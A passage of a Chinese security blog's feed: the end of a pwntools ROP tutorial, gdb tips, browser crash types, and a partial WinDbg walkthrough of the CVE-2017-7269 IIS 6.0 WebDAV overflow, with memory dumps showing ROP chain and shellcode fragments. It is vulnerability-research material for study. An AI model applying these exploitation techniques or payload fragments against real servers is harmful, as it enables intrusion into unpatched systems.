class="hljs-string">&apos;r14&apos;</span>,<span class="hljs-string">&apos;r15&apos;</span>,<span class="hljs-string">&apos;rbp&apos;</span>], order = <span class="hljs-string">&apos;regs&apos;</span>)</span><br></pre></td></tr></tbody></table></figure><br>rop.call, &#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;&#x9700;&#x8981;call&#x7684;&#x51FD;&#x6570;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;&#x51FD;&#x6570;&#x53C2;&#x6570;&#xFF0C;&#x4E3A;list&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x9700;&#x8981;&#x5728;&#x540E;&#x9762;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x2019;,&#x2019;&#x4F7F;&#x5176;&#x53D8;&#x4E3A;list<br>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ROPgadget&#x8FDB;&#x884C;gadget&#x641C;&#x7D22;<p></p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="https://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener">https://pwntools.readthedocs.io/en/stable/</a><br><a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">http://brieflyx.me/2015/python-module/pwntools-intro/</a><br><a href="http://brieflyx.me/2015/python-module/pwntools-advanced/" target="_blank" rel="noopener">http://brieflyx.me/2015/python-module/pwntools-advanced/</a></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb command</title>
      <link href="/2017/04/14/gdb-command/"/>
      <url>/2017/04/14/gdb-command/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="gdb-&#x547D;&#x4EE4;"><a href="#gdb-&#x547D;&#x4EE4;" class="headerlink" title="gdb &#x547D;&#x4EE4;"></a>gdb &#x547D;&#x4EE4;</h2><h3 id="&#x6761;&#x4EF6;&#x65AD;&#x70B9;"><a href="#&#x6761;&#x4EF6;&#x65AD;&#x70B9;" class="headerlink" title="&#x6761;&#x4EF6;&#x65AD;&#x70B9;"></a>&#x6761;&#x4EF6;&#x65AD;&#x70B9;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">command</span> [breakpoints num]</span><br><span class="line">[&#x8BED;&#x53E5;]</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">gdb&gt;<span class="hljs-built_in">command</span> 1</span><br><span class="line">gdb&gt;<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;a=%s b=%s&quot;</span>, a, b</span><br><span class="line">gdb&gt;end</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x67E5;&#x770B;&#x5185;&#x5B58;"><a href="#&#x67E5;&#x770B;&#x5185;&#x5B58;" class="headerlink" title="&#x67E5;&#x770B;&#x5185;&#x5B58;"></a>&#x67E5;&#x770B;&#x5185;&#x5B58;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x/[n][f][u]</span><br><span class="line">n&#x8868;&#x793A;&#x663E;&#x793A;&#x7684;&#x4E2A;&#x6570;</span><br><span class="line">f&#x8868;&#x793A;&#x663E;&#x793A;&#x7684;&#x65B9;&#x5F0F; (x&#x8868;&#x793A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#xFF0C;c&#x8868;&#x793A;&#x5B57;&#x7B26;&#x5F62;&#x5F0F;&#xFF0C;&#x5373;ASCII&#xFF0C;u&#x8868;&#x793A;&#x5341;&#x8FDB;&#x5236;)</span><br><span class="line">u&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x5355;&#x5143;&#x957F;&#x5EA6; (b&#x4E3A;&#x5355;&#x5B57;&#x8282;&#xFF0C;h&#x4E3A;&#x53CC;&#x5B57;&#x8282;)</span><br><span class="line"></span><br><span class="line">x/gx <span class="hljs-variable">$rsp</span></span><br><span class="line">gx&#x8868;&#x793A;64&#x4F4D; 16&#x8FDB;&#x5236;&#x663E;&#x793A;</span><br></pre></td></tr></tbody></table></figure><br>&#x53C2;&#x8003;&#xFF1A;<a href="http://blog.chinaunix.net/uid-22889415-id-3045933.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-22889415-id-3045933.html</a><p></p><h3 id="&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x5230;&#x6587;&#x4EF6;"><a href="#&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x5230;&#x6587;&#x4EF6;" class="headerlink" title="&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x5230;&#x6587;&#x4EF6;"></a>&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x5230;&#x6587;&#x4EF6;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb&gt;<span class="hljs-built_in">set</span> logging file xx.txt</span><br><span class="line">gdb&gt;<span class="hljs-built_in">set</span> logging on  </span><br><span class="line">gdb&gt;<span class="hljs-comment">#do something</span></span><br><span class="line">gdb&gt;<span class="hljs-built_in">set</span> logging off</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id><a href="#" class="headerlink" title></a></h3></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器基础</title>
      <link href="/2017/04/07/browser-base/"/>
      <url>/2017/04/07/browser-base/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7C7B;&#x578B;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7C7B;&#x578B;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7C7B;&#x578B;"></a>&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7C7B;&#x578B;</h2><h2 id="&#x6D4F;&#x89C8;&#x5668;&#x6574;&#x4F53;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x6574;&#x4F53;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x6574;&#x4F53;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;"></a>&#x6D4F;&#x89C8;&#x5668;&#x6574;&#x4F53;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;</h2><p>URL&#x8BF7;&#x6C42; &#x8FD4;&#x56DE;&#x8BF7;&#x6C42;&#x6570;&#x636E; &#x8C03;&#x7528;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x89E3;&#x6790;&#x4EA7;&#x751F;DOM&#x6811; &#x52A0;&#x4E0A;&#x6837;&#x5F0F;&#x4FE1;&#x606F;&#x4EA7;&#x751F;&#x6E32;&#x67D3;&#x6811; &#x7ED8;&#x5236;</p><h2 id="&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x51E0;&#x7C7B;bug"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x51E0;&#x7C7B;bug" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x51E0;&#x7C7B;bug"></a>&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x51E0;&#x7C7B;bug</h2><h4 id="&#x7A7A;&#x6307;&#x9488;"><a href="#&#x7A7A;&#x6307;&#x9488;" class="headerlink" title="&#x7A7A;&#x6307;&#x9488;"></a>&#x7A7A;&#x6307;&#x9488;</h4><p>0x00000000 ~ 0x0000ffff<br>&#x8FD9;&#x90E8;&#x5206;&#x5185;&#x5B58;&#x5C5E;&#x4E8E;&#x7CFB;&#x7EDF;&#x90E8;&#x5206;&#xFF0C;&#x4E0D;&#x80FD;&#x88AB;&#x8BBF;&#x95EE; </p><h4 id="&#x6808;&#x6EA2;&#x51FA;"><a href="#&#x6808;&#x6EA2;&#x51FA;" class="headerlink" title="&#x6808;&#x6EA2;&#x51FA;"></a>&#x6808;&#x6EA2;&#x51FA;</h4><p>&#x8FD9;&#x7C7B;&#x6808;&#x6EA2;&#x51FA; &#x56E0;&#x4E3A;&#x591A;&#x5C42;&#x9012;&#x5F52;&#x6216;&#x8005;&#x6B7B;&#x5FAA;&#x73AF;&#x4E4B;&#x7C7B;&#x7684;&#x5BFC;&#x81F4;&#x6808;&#x8017;&#x5C3D;<br>&#x5F02;&#x5E38;&#x4EE3;&#x7801;(0xc0000fd)</p><h4 id="&#x6808;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;"><a href="#&#x6808;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;" class="headerlink" title="&#x6808;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;"></a>&#x6808;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;</h4><p>&#x8FD9;&#x7C7B;&#x4E3A;&#x6B63;&#x5E38;&#x7684;&#x6EA2;&#x51FA;&#x95EE;&#x9898;<br>&#x5F02;&#x5E38;&#x4EE3;&#x7801;(0xc000409)</p><h4 id="&#x9664;0"><a href="#&#x9664;0" class="headerlink" title="&#x9664;0"></a>&#x9664;0</h4><p>&#x5F02;&#x5E38;&#x4EE3;&#x7801;(0xc0000094)</p><h4 id="&#x5185;&#x5B58;&#x5360;&#x7528;&#x8FC7;&#x5927;"><a href="#&#x5185;&#x5B58;&#x5360;&#x7528;&#x8FC7;&#x5927;" class="headerlink" title="&#x5185;&#x5B58;&#x5360;&#x7528;&#x8FC7;&#x5927;"></a>&#x5185;&#x5B58;&#x5360;&#x7528;&#x8FC7;&#x5927;</h4><p>&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x8FC7;&#x5927; </p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p>&#x767D;&#x5E3D;&#x5B50;&#x8BB2;&#x6D4F;&#x89C8;&#x5668;&#x5B89;&#x5168;</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> browser </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7269 IIS6.0 WebDAV 溢出分析</title>
      <link href="/2017/03/29/CVE-2017-7269/"/>
      <url>/2017/03/29/CVE-2017-7269/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x57FA;&#x672C;&#x4FE1;&#x606F;"><a href="#&#x57FA;&#x672C;&#x4FE1;&#x606F;" class="headerlink" title="&#x57FA;&#x672C;&#x4FE1;&#x606F;"></a>&#x57FA;&#x672C;&#x4FE1;&#x606F;</h2><p>&#x8BE5;&#x6F0F;&#x6D1E;&#x51FA;&#x73B0;&#x5728; IIS 6.0 &#x7684;WebDAV&#x670D;&#x52A1;&#x4E0A;&#xFF0C;&#x7ECF;&#x8FC7;&#x5206;&#x6790;&#x786E;&#x5B9A;&#x662F;&#x5728;httpext.dll&#x4E2D;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5176;&#x4E2D;PoC&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x7684;&#x51FA;&#x9519;&#x51FD;&#x6570;&#x4E5F;&#x5DF2;&#x7ECF;&#x7ED9;&#x51FA;&#xFF0C;&#x5728;ScStoragePathFromUrl&#x4E2D;&#xFF0C;&#x5927;&#x81F4;&#x770B;&#x4E00;&#x4E0B;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x5C06;&#x4F20;&#x5165;&#x7684;URL&#x5B58;&#x50A8;&#x3002;&#x6700;&#x540E;&#x7684;&#x4E00;&#x4E2A;memcpy&#x5C06;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x5230;&#x865A;&#x8868;&#x6307;&#x9488; &#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;</p><p>&#x9644;&#x52A0;&#x7684;&#x662F;w3wp.exe @Keoyo_k0shl<br>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.seebug.org/vuldb/ssvid-92834" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92834</a><br>&#x73AF;&#x5883;&#xFF1A;<br>Win server 2003 sp2<br>IIS 6.0 &#x5F00;&#x542F; WebDAV</p><p><img src="/images/CVE-2017-7269/1.PNG" alt="&#x6F0F;&#x6D1E;&#x70B9;"></p><h2 id="&#x65AD;&#x70B9;&#x8FDB;&#x5165;-&#x5173;&#x952E;&#x65AD;&#x70B9;&#x4F4D;&#x7F6E;"><a href="#&#x65AD;&#x70B9;&#x8FDB;&#x5165;-&#x5173;&#x952E;&#x65AD;&#x70B9;&#x4F4D;&#x7F6E;" class="headerlink" title="&#x65AD;&#x70B9;&#x8FDB;&#x5165;(&#x5173;&#x952E;&#x65AD;&#x70B9;&#x4F4D;&#x7F6E;)"></a>&#x65AD;&#x70B9;&#x8FDB;&#x5165;(&#x5173;&#x952E;&#x65AD;&#x70B9;&#x4F4D;&#x7F6E;)</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 e 673f6c7b     0001 (0001)  0:**** httpext!ScStoragePathFromUrl</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x7B2C;&#x4E00;&#x6B21;&#x547D;&#x4E2D;"><a href="#&#x7B2C;&#x4E00;&#x6B21;&#x547D;&#x4E2D;" class="headerlink" title="&#x7B2C;&#x4E00;&#x6B21;&#x547D;&#x4E2D;"></a>&#x7B2C;&#x4E00;&#x6B21;&#x547D;&#x4E2D;</h2><p>edx &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x5165; http<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:018&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=012cf800 ebx=01e4ed58 ecx=01e4d968 edx=01e4f460 esi=00000000 edi=77ba8ef2</span><br><span class="line">eip=673f6c7b esp=012cf79c ebp=012cf7ac iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">httpext!ScStoragePathFromUrl:</span><br><span class="line">673f6c7b b8150d4167      mov     eax,offset httpext!swscanf+0x14b5 (67410d15)</span><br><span class="line">0:008&gt; dc edx</span><br><span class="line">01e4f460  00740068 00700074 002f003a 006c002f  h.t.t.p.:././.l.</span><br><span class="line">01e4f470  0063006f 006c0061 006f0068 00740073  o.c.a.l.h.o.s.t.</span><br><span class="line">01e4f480  0061002f 00610061 00610061 00610061  /.a.a.a.a.a.a.a.</span><br><span class="line">01e4f490  78636f68 71337761 47726936 4b777a39  hocxaw3q6irG9zwK</span><br><span class="line">01e4f4a0  75534f70 48687a4f 6d545663 39536845  pOSuOzhHcVTmEhS9</span><br><span class="line">01e4f4b0  5567506c 33646763 78454630 54316952  lPgUcgd30FExRi1T</span><br><span class="line">01e4f4c0  6a514c58 42317241 58507035 6c473664  XLQjAr1B5pPXd6Gl</span><br><span class="line">01e4f4d0  546a3539 54435034 50617752 6d4b3232  95jT4PCTRwaP22Km</span><br></pre></td></tr></tbody></table></figure><br>&#x4E5F;&#x6B63;&#x662F; &#x524D;&#x9762;&#x4F20;&#x5165;&#x7684;URL&#x4F5C;&#x4E86;&#x4E00;&#x6B21;MultiByteToWideChar<p></p><p>&#x7B80;&#x5355;&#x8DDF;&#x4E00;&#x6B21;&#x4E4B;&#x540E; &#x4E00;&#x5171;&#x547D;&#x4E2D;&#x4E86;6&#x6B21;&#xFF1A; </p><p>&#x524D;&#x4E09;&#x6B21;&#x4E00;&#x8D77;  checkif&#x2026;.<br>&#x7B2C;&#x4E00;&#x6B21;&#x68C0;&#x67E5;<br>&#x7B2C;&#x4E8C;&#x6B21; &#x6570;&#x636E; &#x62F7;&#x8D1D;  (<a href="http://aaaaaaa" target="_blank" rel="noopener">http://aaaaaaa</a>) &#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x8986;&#x76D6;&#x4E00;&#x4E2A;&#x6808;&#x5730;&#x5740;&#xFF0C;&#x8BE5;&#x5730;&#x5740;&#x7528;&#x4E8E;&#x540E;&#x9762;&#x7684;&#x5806;&#x5206;&#x914D; &#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x5206;&#x914D;&#xFF08;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x7ED5;&#x8FC7;gs&#x7684;&#x4FDD;&#x62A4;&#xFF09;<br>&#x7B2C;&#x4E09;&#x6B21; &#x6570;&#x636E; &#x62F7;&#x8D1D;  (<a href="http://bbbbbbb" target="_blank" rel="noopener">http://bbbbbbb</a>) &#x5E03;&#x5C40;&#x4F5C;&#x4E3A;&#x540E;&#x9762;&#x7684;&#x6267;&#x884C;&#x4EE3;&#x7801; </p><p>&#x540E;&#x4E09;&#x6B21;&#x4E00;&#x8D77;  CParseLockTokenHeader<br>&#x7B2C;&#x56DB;&#x6B21;&#x5F00;&#x59CB; &#x8FDB;&#x5165; httpext!CParseLockTokenHeader::HrGetLockIdForPath<br>&#x7B2C;&#x56DB;&#x6B21;&#x4E0D;&#x8FDB;&#x884C;&#x590D;&#x5236;<br>&#x7B2C;&#x4E94;&#x6B21; &#x5BF9;&#x7B2C;&#x4E00;&#x4E2A;&#x5904;&#x7406;  &#x7528;&#x6765;&#x5E03;&#x5C40; &#x6765;&#x8986;&#x76D6;&#x5230;&#x865A;&#x8868;&#x6307;&#x9488; &#x6307;&#x5411;&#x524D;&#x9762;&#x4E24;&#x6B21;&#x7684;&#x6570;&#x636E;&#x62F7;&#x8D1D; &#xFF08;&#x56E0;&#x6B64;&#x6B64;&#x65F6;&#x865A;&#x51FD;&#x6570;&#x6307;&#x9488;&#x5730;&#x5740;&#x5728;&#x590D;&#x5236;&#x7684;&#x9996;&#x5730;&#x5740;&#x540E;&#x9762;&#xFF0C;&#x5BFC;&#x81F4;&#x590D;&#x5236;&#x6210;&#x4E3A;&#x53EF;&#x80FD;&#xFF09;<br>&#x7B2C;&#x516D;&#x6B21; &#x5BF9;&#x7B2C;&#x4E8C;&#x4E2A;&#x5904;&#x7406;  &#x89E6;&#x53D1;<br>&#x89E6;&#x53D1; &#x8C03;&#x7528;&#x7684;&#x662F; ScStripAndCheckHttpPrefix -&gt; ScStripAndCheckHttpPrefix(call    dword ptr [eax+24h])&#x5F00;&#x59CB;ROP</p><p>&#x6700;&#x540E;&#x4E00;&#x6B21;&#x547D;&#x4E2D;&#x7684;&#x6570;&#x636E; &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6B63;&#x597D;&#x5C31;&#x662F; &#x7B2C;&#x4E8C;&#x4E2A;URL&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4E3A;ROP + shellcode &#x7136;&#x540E;&#x8C03;&#x7528;&#x6267;&#x884C;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; dc ecx</span><br><span class="line">680313c0  680313c0 68006e4f 68006e4f 766a4247  ...hOn.hOn.hGBjv</span><br><span class="line">680313d0  680313c0 4f744257 52345947 4b424b66  ...hWBtOGY4RfKBK</span><br><span class="line">680313e0  786f7464 68016082 727a5135 4d47747a  dtox.`.h5QzrztGM</span><br><span class="line">680313f0  57574459 6800b113 6e6f3176 680124e3  YDWW...hv1on.$.h</span><br><span class="line">68031400  68031460 7ffe0300 ffffffff 680313c0  `..h...........h</span><br><span class="line">68031410  6803046e 7470716e 68031434 680129e7  n..hnqpt4..h.).h</span><br><span class="line">68031420  68009391 666e3931 30524955 766b546b  ...h19nfUIR0kTkv</span><br><span class="line">68031430  7961724a 6803141c 68006e05 79687732  Jray...h.n.h2why</span><br><span class="line">0:008&gt; dc ecx+0x24</span><br><span class="line">680313e4  68016082 727a5135 4d47747a 57574459  .`.h5QzrztGMYDWW  <span class="hljs-comment">### ROP</span></span><br><span class="line">680313f4  6800b113 6e6f3176 680124e3 68031460  ...hv1on.$.h`..h</span><br><span class="line">68031404  7ffe0300 ffffffff 680313c0 6803046e  ...........hn..h</span><br><span class="line">68031414  7470716e 68031434 680129e7 68009391  nqpt4..h.).h...h</span><br><span class="line">68031424  666e3931 30524955 766b546b 7961724a  19nfUIR0kTkvJray</span><br><span class="line">68031434  6803141c 68006e05 79687732 366c4d69  ...h.n.h2whyiMl6</span><br><span class="line">68031444  4d704468 68008246 32534877 68021daa  hDpMF..hwHS2...h</span><br><span class="line">68031454  43356f6a 680313f8 680129e7 00560056  jo5C...h.).hV.V.  <span class="hljs-comment">### shellcode</span></span><br><span class="line">0:008&gt; dc</span><br><span class="line">68031464  00410059 00340034 00340034 00340034  Y.A.4.4.4.4.4.4.</span><br><span class="line">68031474  00340034 00340034 00410051 00410054  4.4.4.4.Q.A.T.A.</span><br><span class="line">68031484  00410058 0041005a 00410050 00510033  X.A.Z.A.P.A.3.Q.</span><br><span class="line">68031494  00440041 005a0041 00420041 00520041  A.D.A.Z.A.B.A.R.</span><br><span class="line">680314a4  004c0041 00590041 00490041 00510041  A.L.A.Y.A.I.A.Q.</span><br><span class="line">680314b4  00490041 00510041 00500041 00350041  A.I.A.Q.A.P.A.5.</span><br><span class="line">680314c4  00410041 00500041 005a0041 00410031  A.A.A.P.A.Z.1.A.</span><br><span class="line">680314d4  00310049 00490041 00490041 004a0041  I.1.A.I.A.I.A.J.</span><br><span class="line">0:008&gt; dc</span><br><span class="line">680314e4  00310031 00490041 00490041 00580041  1.1.A.I.A.I.A.X.</span><br><span class="line">680314f4  00350041 00410038 00500041 005a0041  A.5.8.A.A.P.A.Z.</span><br><span class="line">68031504  00420041 00420041 00490051 00410031  A.B.A.B.Q.I.1.A.</span><br><span class="line">68031514  00510049 00410049 00510049 00310049  I.Q.I.A.I.Q.I.1.</span><br><span class="line">68031524  00310031 00410031 00410049 0051004a  1.1.1.A.I.A.J.Q.</span><br><span class="line">68031534  00310049 00590041 005a0041 00410042  I.1.A.Y.A.Z.B.A.</span><br><span class="line">68031544  00410042 00410042 00410042 00330042  B.A.B.A.B.A.B.3.</span><br><span class="line">68031554  00410030 00420050 00340039 004a0034  0.A.P.B.9.4.4.J.</span><br></pre></td></tr></tbody></table></figure><br>&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x5F80;&#x524D;&#x67E5;&#x770B; &#x7A76;&#x7ADF;&#x662F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x4FEE;&#x6539;&#x8986;&#x76D6;&#x7684;<p></p><h2 id="&#x8986;&#x76D6;ROP-shellcode-&#x7B2C;&#x4E09;&#x6B21;&#x51FB;&#x4E2D;"><a href="#&#x8986;&#x76D6;ROP-shellcode-&#x7B2C;&#x4E09;&#x6B21;&#x51FB;&#x4E2D;" class="headerlink" title="&#x8986;&#x76D6;ROP+shellcode(&#x7B2C;&#x4E09;&#x6B21;&#x51FB;&#x4E2D;)"></a>&#x8986;&#x76D6;ROP+shellcode(&#x7B2C;&#x4E09;&#x6B21;&#x51FB;&#x4E2D;)</h2><p>&#x8FD9;&#x90E8;&#x5206;&#x5176;&#x5B9E;&#x662F;&#x62F7;&#x8D1D;URL2&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5C06;&#x5176;&#x62F7;&#x8D1D;&#x5230;&#x524D;&#x9762;&#x8BBE;&#x5B9A;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:008&gt; dc ebp-450</span><br><span class="line">012cf348  680312c0 00000000 00000310 01fc0070  ...h........p...</span><br><span class="line">012cf358  012cf40c 003a0063 0069005c 0065006e  ..,.c.:.\.i.n.e.</span><br><span class="line">012cf368  00700074 00620075 0077005c 00770077  t.p.u.b.\.w.w.w.</span><br><span class="line">012cf378  006f0072 0074006f 0062005c 00620062  r.o.o.t.\.b.b.b.</span><br><span class="line">012cf388  00620062 00620062 61757948 6f674f43  b.b.b.b.HyuaCOgo</span><br><span class="line">012cf398  48456b6f 67753646 38714433 5a625765  okEHF6ug3Dq8eWbZ</span><br><span class="line">012cf3a8  56615435 6a536952 384e5157 63555948  5TaVRiSjWQN8HYUc</span><br><span class="line">012cf3b8  43644971 34686472 71794758 6b55336b  qIdCrdh4XGyqk3Uk</span><br><span class="line">0:008&gt; dc 680312c0 </span><br><span class="line">680312c0  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.</span><br><span class="line">680312d0  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.</span><br><span class="line">680312e0  0074006f 0062002f 00620062 00620062  o.t./.b.b.b.b.b.</span><br><span class="line">680312f0  00620062 61757948 6f674f43 48456b6f  b.b.HyuaCOgookEH</span><br><span class="line">68031300  67753646 38714433 5a625765 56615435  F6ug3Dq8eWbZ5TaV</span><br><span class="line">68031310  6a536952 384e5157 63555948 43644971  RiSjWQN8HYUcqIdC</span><br><span class="line">68031320  34686472 71794758 6b55336b 504f6d48  rdh4XGyqk3UkHmOP</span><br><span class="line">68031330  34717a46 74436f54 6f6f5956 34577341  Fzq4ToCtVYooAsW4</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x8986;&#x76D6;&#x865A;&#x51FD;&#x6570;&#x6307;&#x9488;-&#x7B2C;&#x4E94;&#x6B21;&#x51FB;&#x4E2D;"><a href="#&#x8986;&#x76D6;&#x865A;&#x51FD;&#x6570;&#x6307;&#x9488;-&#x7B2C;&#x4E94;&#x6B21;&#x51FB;&#x4E2D;" class="headerlink" title="&#x8986;&#x76D6;&#x865A;&#x51FD;&#x6570;&#x6307;&#x9488;(&#x7B2C;&#x4E94;&#x6B21;&#x51FB;&#x4E2D;)"></a>&#x8986;&#x76D6;&#x865A;&#x51FD;&#x6570;&#x6307;&#x9488;(&#x7B2C;&#x4E94;&#x6B21;&#x51FB;&#x4E2D;)</h2><p>&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x5728;ScStoragePathFromUrl&#x65F6; memcpy&#x5904;&#x7406;<br>&#x9996;&#x5148;&#x8FDB;&#x5165;&#x7684;&#x662F; httpext!CParseLockTokenHeader::HrGetLockIdForPath&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x6765;&#x8C03;&#x7528;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x6838;&#x5FC3;&#x7684;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x865A;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x4EE5;&#x53CA;&#x590D;&#x5236;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x90FD;&#x662F;&#x5728;&#x8FD9;&#x91CC;&#x3002;<br></p><figure 